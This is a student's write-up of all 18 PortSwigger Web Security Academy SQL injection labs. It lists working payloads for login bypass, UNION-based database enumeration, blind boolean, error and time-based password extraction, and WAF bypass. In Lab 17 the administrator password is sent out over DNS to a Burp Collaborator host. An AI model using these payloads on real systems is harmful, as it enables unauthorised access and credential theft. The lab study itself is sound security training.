# PortSwigger Web Security Academy Labs
### Solved by: Naman Yuvraj

B.Tech Cybersecurity Engineering Student | Application Security Learner  
**College:** Rungta College of Engineering and Technology, Bhilai  
**Tools:** Burp Suite Professional | Kali Linux | Firefox

---

## Progress Tracker

| Topic | Total Labs | Completed | Status |
|-------|-----------|-----------|--------|
| SQL Injection | 18 | 18 | ✅ Complete |
| Authentication | 14 | 6 | 🔄 In Progress |
| Access Control | 13 | 0 | ⏳ Upcoming |
| XSS | 30 | 0 | ⏳ Upcoming |
| CSRF | 8 | 0 | ⏳ Upcoming |
| SSRF | 7 | 0 | ⏳ Upcoming |
| XXE | 9 | 0 | ⏳ Upcoming |
| **Total** | **99** | **24** | |

---

## SQL Injection Labs

# PortSwigger — SQL Injection Labs
### Naman Yuvraj

18/18 Complete ✅ | Tools: Burp Suite Pro, Kali Linux

---

## Lab 1 — WHERE Clause Hidden Data ✅
**Vulnerability:** SQL Injection in product category filter

**Payload:**
```
'+OR+1=1--
```

All hidden products retrieved by making WHERE clause always true.

---

## Lab 2 — Login Bypass ✅
**Vulnerability:** SQL Injection in login form

**Payload:**
```
administrator'--
```

Logged in as admin without password — comment ignored the password check.

---

## Lab 3 — Oracle DB Version ✅
**Vulnerability:** UNION based SQLi on Oracle database

**Payload:**
```
'+UNION+SELECT+BANNER,NULL+FROM+v$version--
```

Oracle requires FROM DUAL — v$version stores DB version info.

---

## Lab 4 — MySQL/Microsoft DB Version ✅
**Vulnerability:** UNION based SQLi on MySQL/MSSQL

**Payload:**
```
'+UNION+SELECT+@@version,NULL--
```

@@version works on both MySQL and MSSQL.

---

## Lab 5 — DB Contents Non-Oracle ✅
**Vulnerability:** Full database enumeration via SQLi

**Payloads:**
```
'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--

'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns
+WHERE+table_name='users_abcdef'--

'+UNION+SELECT+username,password+FROM+users_abcdef--
```

information_schema exposes full database structure — extracted admin credentials.

---

## Lab 6 — DB Contents Oracle ✅
**Vulnerability:** Database enumeration on Oracle

**Payloads:**
```
'+UNION+SELECT+table_name,NULL+FROM+all_tables--

'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns
+WHERE+table_name='USERS_ABCDEF'--

'+UNION+SELECT+USERNAME,PASSWORD+FROM+USERS_ABCDEF--
```

Oracle uses all_tables and all_tab_columns instead of information_schema.

---

## Lab 7 — UNION Column Count ✅
**Vulnerability:** UNION attack — finding number of columns

**Payloads:**
```
'+ORDER+BY+1--
'+ORDER+BY+2--
'+ORDER+BY+3--   (error = 2 columns)
'+UNION+SELECT+NULL,NULL--
```

ORDER BY throws error when number exceeds actual column count.

---

## Lab 8 — Finding Text Column ✅
**Vulnerability:** UNION attack — identifying string columns

**Payloads:**
```
'+UNION+SELECT+'abcdef',NULL--   (error)
'+UNION+SELECT+NULL,'abcdef'--   (worked)
```

Column 2 accepts string data — column 1 is integer type.

---

## Lab 9 — Retrieve Data from Other Tables ✅
**Vulnerability:** UNION attack — cross table extraction

**Payload:**
```
'+UNION+SELECT+username,password+FROM+users--
```

UNION allows reading from any table — full credentials extracted in one query.

---

## Lab 10 — Multiple Values in Single Column ✅
**Vulnerability:** UNION attack — string concatenation

**Payload:**
```
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```

Oracle || operator concatenates both values into one column using ~ as separator.

---

## Lab 11 — Blind SQLi Conditional Responses ✅
**Vulnerability:** Blind SQLi using boolean response

**Payloads:**
```
xyz' AND '1'='1   (Welcome back shown)
xyz' AND '1'='2   (Welcome back hidden)

xyz' AND (SELECT 'a' FROM users
WHERE username='administrator')='a

xyz' AND (SELECT SUBSTRING(password,§1§,1)
FROM users WHERE username='administrator')='§a§
```
Burp Intruder Cluster Bomb — Payload 1: 1-20, Payload 2: a-z 0-9, Grep: Welcome back


No visible output — Welcome back message used as true/false indicator to extract password.

---

## Lab 12 — Blind SQLi Conditional Errors ✅
**Vulnerability:** Error-based blind SQLi on Oracle

**Payloads:**
```
'AND+(SELECT+CASE+WHEN+LENGTH(password)>1
+THEN+TO_CHAR(1/0)+ELSE+'a'+END+FROM+users
+WHERE+username='administrator')='a'--

'AND+(SELECT+CASE+WHEN+SUBSTR(password,§1§,1)='§a§'
+THEN+TO_CHAR(1/0)+ELSE+'a'+END+FROM+users
+WHERE+username='administrator')='a'--
```
Status 500 = TRUE | Status 200 = FALSE


TO_CHAR(1/0) causes divide-by-zero error — Oracle specific trick to trigger 500 error.

---

## Lab 13 — Visible Error Based SQLi ✅
**Vulnerability:** Data leaked through verbose error messages

**Payloads:**
```
'AND 1=CAST((SELECT username FROM users LIMIT 1)as int)--
'AND 1=CAST((SELECT password FROM users LIMIT 1)as int)--
```
Password: xeu2fy3zjhnnt1gwnhpvr


CAST forces type conversion error — PostgreSQL leaked actual data in the error message.

---

## Lab 14 — Blind SQLi Time Delays ✅
**Vulnerability:** Time-based blind SQLi on PostgreSQL

**Payloads:**
```
'||(SELECT sleep(10))--         (330ms — not MySQL)
'||(SELECT+pg_sleep(10))--      (10,255ms — PostgreSQL confirmed)
```

pg_sleep caused 10 second delay — confirmed PostgreSQL and time-based injection point.

---

## Lab 15 — Blind SQLi Time Delays + Data ✅
**Vulnerability:** Data extraction via time delays on PostgreSQL

**Payloads:**
```
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10)
ELSE pg_sleep(0) END)--
(10,567ms = vulnerable)

'||(SELECT+CASE+WHEN+(username='administrator')
+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END FROM users)--
(10,620ms = admin exists)

'||(SELECT+CASE+WHEN+(username='administrator'
AND LENGTH(password)>19)+THEN+pg_sleep(10)
+ELSE+pg_sleep(0)+END FROM users)--
(password length = 20)

'||(SELECT+CASE+WHEN+(username='administrator'
AND SUBSTRING(password,§1§,1)='§a§')
+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END FROM users)--
```
Cluster Bomb — response > 10000ms = correct character
Password: nm6ybys9w1hsrggi0e8z


Timing difference of just milliseconds used to extract 20-character password.

---

## Lab 16 — Blind SQLi Out-of-Band ✅
**Vulnerability:** DNS out-of-band SQLi on Oracle

**Payload:**
```
'+UNION+SELECT+EXTRACTVALUE(xmltype('
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY % remote SYSTEM
"http://BURP-COLLABORATOR-URL/">
%remote;]>'),'/l')+FROM+dual--
```

Burp Collaborator received DNS lookup — confirmed out-of-band channel via Oracle XML.

---

## Lab 17 — Blind SQLi Out-of-Band Data ✅
**Vulnerability:** Password exfiltration via DNS on Oracle

**Payload:**
```
'UNION+SELECT+EXTRACTVALUE(xmltype('
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY % remote SYSTEM
"http://'||(SELECT+password+FROM+users
+WHERE+username='administrator')||
'.BURP-COLLABORATOR-URL/">
%remote;]>'),'/l')+FROM+dual--
```
Password: ocytv5czb7ske6uk8yob


Password embedded as DNS subdomain — appeared in Collaborator request log.

---

## Lab 18 — Filter Bypass via XML Encoding ✅
**Vulnerability:** WAF bypass using hex encoding on XML injection point

**Payload:**
```
UNION SELECT password from users
where username='administrator'--
(encoded with HackVector hex_entities)
```
Password: bhb1t4qozu37er5esp3x


WAF blocked normal SQL keywords — HackVector hex_entities encoding bypassed detection.
